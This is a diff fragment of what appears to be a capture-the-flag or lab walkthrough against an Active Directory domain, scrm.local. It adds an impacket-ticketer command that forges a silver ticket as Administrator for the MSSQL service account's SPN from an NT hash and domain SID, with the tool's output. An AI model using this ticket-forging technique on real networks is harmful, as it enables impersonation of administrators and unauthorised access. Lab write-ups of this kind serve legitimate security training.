@@ -310,5 +310,24 @@ MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 16:32:02.351452  2026
 Then ill garb the accounts SPN
 
 ```python
+impacket-ticketer -nthash 'B999A16500B87D17EC7F2E2A68778F05' -domain-sid 'S-1-5-21-2743207045-1827831105-2542523200' -domain 'scrm.local' -spn 'MSSQLSvc/dc1.scrm.local' 'Administrator'             
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for scrm.local/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache
+```
+I now have an administrator ticket so i should be able to authenticate to mssql
+
+```python
 
 ```
